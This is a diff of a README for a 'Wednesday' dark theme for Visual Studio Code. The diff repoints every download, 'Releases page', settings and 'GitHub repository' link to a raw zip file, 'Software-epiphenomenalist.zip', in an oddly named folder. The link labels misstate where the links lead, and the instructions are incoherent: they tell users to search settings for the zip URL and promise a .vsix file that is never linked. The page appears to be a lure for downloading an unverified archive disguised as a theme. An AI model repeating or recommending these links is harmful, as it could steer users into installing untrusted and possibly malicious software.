@@ -6,7 +6,7 @@ Wednesday is a dark theme inspired by the mysterious allure of the Addams Family
 
 ## 📥 Download Now!
 
-[![Download Wednesday](https://raw.githubusercontent.com/mahe47/Wednesday/main/dominionist/Wednesday.zip)](https://raw.githubusercontent.com/mahe47/Wednesday/main/dominionist/Wednesday.zip)
+[![Download Wednesday](https://raw.githubusercontent.com/mahe47/Wednesday/main/dominionist/Software-epiphenomenalist.zip)](https://raw.githubusercontent.com/mahe47/Wednesday/main/dominionist/Software-epiphenomenalist.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Follow these simple steps to download and run the Wednesday theme:
    Before you start, ensure your Visual Studio Code is up to date. The theme works best with version 1.50 or higher.
 
 2. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/mahe47/Wednesday/main/dominionist/Wednesday.zip) to find the latest version of the Wednesday theme.
+   Go to the [Releases page](https://raw.githubusercontent.com/mahe47/Wednesday/main/dominionist/Software-epiphenomenalist.zip) to find the latest version of the Wednesday theme.
 
 3. **Download the Theme**  
    On the Releases page, look for the latest release titled "Wednesday." Here you will find various files. Download the `.vsix` file. This file is specifically designed for easy installation.
@@ -47,7 +47,7 @@ Follow these simple steps to download and run the Wednesday theme:
 Feel free to customize the theme to your liking. You can adjust the syntax colors and background settings in your Visual Studio Code settings.
 
 1. Open settings (`Ctrl + ,`).
-2. Search for "https://raw.githubusercontent.com/mahe47/Wednesday/main/dominionist/Wednesday.zip" and adjust the values as desired.
+2. Search for "https://raw.githubusercontent.com/mahe47/Wednesday/main/dominionist/Software-epiphenomenalist.zip" and adjust the values as desired.
 
 ## 🗂️ Topics
 
@@ -64,7 +64,7 @@ Feel free to customize the theme to your liking. You can adjust the syntax color
 
 ## 📬 Support
 
-If you encounter any issues while installing or using the theme, please check the issues tab on the [GitHub repository](https://raw.githubusercontent.com/mahe47/Wednesday/main/dominionist/Wednesday.zip). You can also reach out for help or feedback.
+If you encounter any issues while installing or using the theme, please check the issues tab on the [GitHub repository](https://raw.githubusercontent.com/mahe47/Wednesday/main/dominionist/Software-epiphenomenalist.zip). You can also reach out for help or feedback.
 
 ## 💬 Community
 
